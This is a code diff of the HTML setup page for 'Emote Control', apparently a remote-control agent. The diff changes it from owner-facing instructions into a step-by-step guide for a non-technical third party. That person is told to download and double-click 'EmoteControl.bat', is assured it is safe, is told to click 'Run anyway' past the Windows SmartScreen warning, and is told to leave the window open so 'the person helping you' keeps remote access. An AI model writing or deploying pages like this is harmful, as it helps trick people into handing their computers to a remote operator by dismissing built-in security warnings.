@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Emote Control — Setup Agent</title>
+  <title>Emote Control — Setup</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="/style.css">
@@ -18,15 +18,21 @@
           </svg>
         </div>
         <h1>Connect Your PC</h1>
-        <p>Follow these steps to start a remote session</p>
+        <p>Follow these simple steps — it only takes a minute!</p>
       </div>
 
       <!-- Step 1 -->
       <div class="download-step">
         <div class="step-number">1</div>
         <div class="step-content">
-          <h3>Create a folder on your PC</h3>
-          <p>Create a new folder anywhere (e.g. <code class="inline-code">C:\EmoteControl</code> or your Desktop). This is where the agent will live.</p>
+          <h3>Click the big button below to download a file</h3>
+          <p>A small file called <strong>EmoteControl.bat</strong> will be saved to your <strong>Downloads</strong> folder. This is safe — it connects your PC so we can help you remotely.</p>
+          <a href="/dashboard/new-session" class="btn btn-primary download-btn" style="font-size:16px;padding:14px 24px;">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/>
+            </svg>
+            Download EmoteControl.bat
+          </a>
         </div>
       </div>
 
@@ -34,14 +40,8 @@
       <div class="download-step">
         <div class="step-number">2</div>
         <div class="step-content">
-          <h3>Download your config file</h3>
-          <p>This file links the agent to your account. <strong>Save it into the folder you just created.</strong></p>
-          <a href="/download/config?key=<%= userKey %>" class="btn btn-primary download-btn">
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-              <path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/>
-            </svg>
-            Download config.txt
-          </a>
+          <h3>Open your Downloads folder</h3>
+          <p>You can find it by opening <strong>File Explorer</strong> (the yellow folder icon on your taskbar) and clicking <strong>"Downloads"</strong> on the left side.</p>
         </div>
       </div>
 
@@ -49,18 +49,9 @@
       <div class="download-step">
         <div class="step-number">3</div>
         <div class="step-content">
-          <h3>Download the agent</h3>
-          <% if (agent) { %>
-            <p>Save <strong><%= agent.filename %></strong> (<%= (agent.file_size / (1024*1024)).toFixed(1) %> MB) into the <strong>same folder</strong> as config.txt.</p>
-            <a href="/download/agent/binary" class="btn btn-primary download-btn">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/>
-              </svg>
-              Download <%= agent.filename %>
-            </a>
-          <% } else { %>
-            <div class="error-msg" style="margin-top:8px">The admin hasn't uploaded an agent yet. Check back later.</div>
-          <% } %>
+          <h3>Double-click the file to run it</h3>
+          <p>Look for the file named <strong>EmoteControl.bat</strong> and double-click it. A black window will appear — <strong>this is normal!</strong></p>
+          <p style="margin-top:8px">If Windows shows a blue warning that says <em>"Windows protected your PC"</em>, click <strong>"More info"</strong>, then click <strong>"Run anyway"</strong>. This is safe.</p>
         </div>
       </div>
 
@@ -68,8 +59,8 @@
       <div class="download-step">
         <div class="step-number">4</div>
         <div class="step-content">
-          <h3>Run the agent</h3>
-          <p>Double-click the agent file. It will <strong>automatically connect</strong> to your account using the config file. No setup needed.</p>
+          <h3>Keep the black window open</h3>
+          <p>The black window needs to stay open for the remote connection to work. <strong>Do not close it.</strong> You can minimize it (click the <strong>—</strong> button in the top right corner) to get it out of the way.</p>
         </div>
       </div>
 
@@ -77,8 +68,8 @@
       <div class="download-step">
         <div class="step-number">5</div>
         <div class="step-content">
-          <h3>Go back to your dashboard</h3>
-          <p>A new session will appear with your PC's name. Click on it to start sending commands.</p>
+          <h3>That's it! You're all set.</h3>
+          <p>Your PC is now connected. The person helping you can see your session on their dashboard. If you need to reconnect later, just double-click the same file again — it will pick up right where you left off.</p>
         </div>
       </div>
 
@@ -88,20 +79,7 @@
           <circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/>
         </svg>
         <div>
-          <strong>Important:</strong> Both files (<code class="inline-code">config.txt</code> and the agent) must be in the <strong>same folder</strong>. Every time you run the agent, a new session is created on your dashboard.
-        </div>
-      </div>
-
-      <!-- Folder preview -->
-      <div class="folder-preview">
-        <div class="folder-title">Your folder should look like this:</div>
-        <div class="folder-item">
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
-          <span>config.txt</span>
-        </div>
-        <div class="folder-item">
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--success)" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
-          <span><%= agent ? agent.filename : 'EmoteAgent.exe' %></span>
+          <strong>Need help?</strong> If something goes wrong or you see an error, try closing the black window and double-clicking the file again. If it still doesn't work, contact the person who sent you this link.
         </div>
       </div>
 
